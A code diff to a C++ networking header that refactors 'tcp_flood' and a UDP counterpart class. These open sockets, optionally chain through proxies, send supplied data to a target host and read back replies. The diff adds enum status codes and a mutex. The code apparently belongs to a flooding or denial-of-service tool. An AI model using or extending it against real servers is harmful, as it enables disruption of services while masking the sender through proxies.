@@ -20,6 +20,7 @@
 #define PROXY_CONNECT "CONNECT"
 #define PROXY_CONNECT_SIZE ::net::__detail__::consteval_strlen(PROXY_CONNECT)
 #define ADDRESS_MAX_LEN ::net::__detail__::consteval_strlen("255.255.255.255:65535")
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 namespace net
 {
@@ -165,7 +166,10 @@ namespace net
 		
 		[[nodiscard]] inline std::string get_ip() const
 		{
-			return {::inet_ntoa(address.sin_addr)};
+			if (address.sin_addr.s_addr)
+				return {::inet_ntoa(address.sin_addr)};
+			else
+				return hostname;
 		}
 		
 		[[nodiscard]] inline in_port_t get_port() const
@@ -182,14 +186,22 @@ namespace net
 		std::string hostname;
 	};
 	
+	enum : int
+	{
+		r_failed = 0,
+		r_success,
+		r_read_failed
+	};
+	
 	class tcp_flood
 	{
 	public:
+		
 		inline tcp_flood(
 				const inet_address& address, const std::string& data,
 				const inet_address* proxy, int proxytype = PROXYSOCKET_TYPE_NONE, const char* proxy_user = "", const char* proxy_password = "",
 				bool debug = false)
-				: address(address)
+				: address(address), socket(::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))
 		{
 			proxysocketconfig proxysock_cfg;
 			if (proxy)
@@ -200,42 +212,60 @@ namespace net
 				proxysocketconfig_use_proxy_dns(proxysock_cfg, 1);
 				proxysocketconfig_add_proxy(proxysock_cfg, proxytype, proxy->get_ip().c_str(), proxy->get_port(), proxy_user, proxy_password);
 				char* errmsg;
-				if (status && (socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
-					status = false;
+				::close(socket);
+				if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
+				{
+					status = r_failed;
+					return;
+				}
 			}
 			else
 			{
-				if (status && ::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
-					status = false;
-			}
-			
-			if (status && ::send(socket, data.c_str(), data.size(), 0) < 0)
-				status = false;
-			
-			if (status)
-			{
-				status = false;
-				char tmp;
-				size_t recved;
 				if (debug)
-					printf("data = R\"(");
-				for (size_t i = 0; ((recved = ::recv(socket, &tmp, sizeof tmp, MSG_DONTWAIT) >= 0) ||
-									errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+					::fprintf(
+							stdout, "Connecting to the server %s:%hu... Sock = %d. Addr = %d.\n",
+							address.get_ip().c_str(), address.get_port(), socket, address.address.sin_addr.s_addr
+					);
+				if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
 				{
-					::usleep(1000);
-					if (debug)
-						if (recved > 0)
-						{
-							printf("\\%x", tmp);
-							status = true;
-						}
+					status = r_failed;
+					return;
 				}
-				if (debug)
-					printf(")\"\n");
 			}
+			
+			if (debug)
+				::fprintf(stdout, "Sending data to %s:%hu...\n", address.get_ip().c_str(), address.get_port());
+			if (::send(socket, data.c_str(), data.size(), 0) < 0)
+			{
+				status = r_failed;
+				return;
+			}
+			
+			status = r_read_failed;
+			char tmp;
+			size_t recved;
+			if (debug)
+				printf("received = R\"(");
+			::pthread_mutex_lock(&mutex);
+			for (size_t i = 0; ((recved = ::recv(socket, &tmp, sizeof tmp, MSG_DONTWAIT) >= 0) ||
+								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+			{
+				::pthread_mutex_unlock(&mutex);
+				::usleep(1000);
+				if (debug)
+					if (recved > 0)
+					{
+						printf("\\%x", tmp);
+						status = r_success;
+					}
+				::pthread_mutex_lock(&mutex);
+			}
+			::pthread_mutex_unlock(&mutex);
+			if (debug)
+				printf(")\"\n");
 		}
 		
-		inline operator bool()
+		inline operator decltype(r_failed)()
 		{
 			return status;
 		}
@@ -247,7 +277,7 @@ namespace net
 	
 	private:
 		int socket;
-		bool status = true;
+		decltype(r_failed) status = r_success;
 		inet_address address;
 	};
 	
@@ -258,7 +288,7 @@ namespace net
 				: address(address), socket(::socket(AF_INET, SOCK_DGRAM, IPPROTO_IP))
 		{
 			if (::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
-				status = false;
+				status = r_failed;
 
 //			::sleep(1);
 
@@ -280,7 +310,7 @@ namespace net
 //			std::cout.flush();
 		}
 		
-		inline operator bool()
+		inline operator decltype(r_failed)()
 		{
 			return status;
 		}
@@ -292,7 +322,7 @@ namespace net
 	
 	private:
 		int socket;
-		bool status = true;
+		decltype(r_failed) status = r_success;
 		inet_address address;
 	};
 }
